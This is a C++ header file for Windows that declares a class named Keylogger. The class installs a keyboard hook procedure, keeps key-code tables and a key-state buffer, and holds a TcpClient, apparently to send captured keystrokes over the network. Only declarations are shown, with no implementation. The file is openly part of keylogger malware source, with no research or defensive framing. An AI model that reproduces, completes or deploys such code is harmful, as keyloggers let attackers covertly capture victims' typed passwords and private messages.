#pragma once

#include <Windows.h>
#include <tchar.h>
#include <string>
#include <vector>
#include "TcpClient.h"

#ifndef UNICODE
#define UNICODE
#endif // !UNICODE

class Keylogger
{
public:
	BOOLEAN TrySetHook();
	Keylogger(TcpClient client);
	~Keylogger();

private:
	static TcpClient* client;
	static HHOOK hHook;
	static LRESULT CALLBACK KeyboardProc(IN int code, IN WPARAM wParam, IN LPARAM lParam);
	static const std::vector<BYTE> valueKeys;
	static const std::vector<BYTE> specialKeys;
	static const std::vector<std::vector<BYTE>> keySets;
	static const std::vector<std::wstring> specialKeyNames;
	static BYTE keyState[256];
};

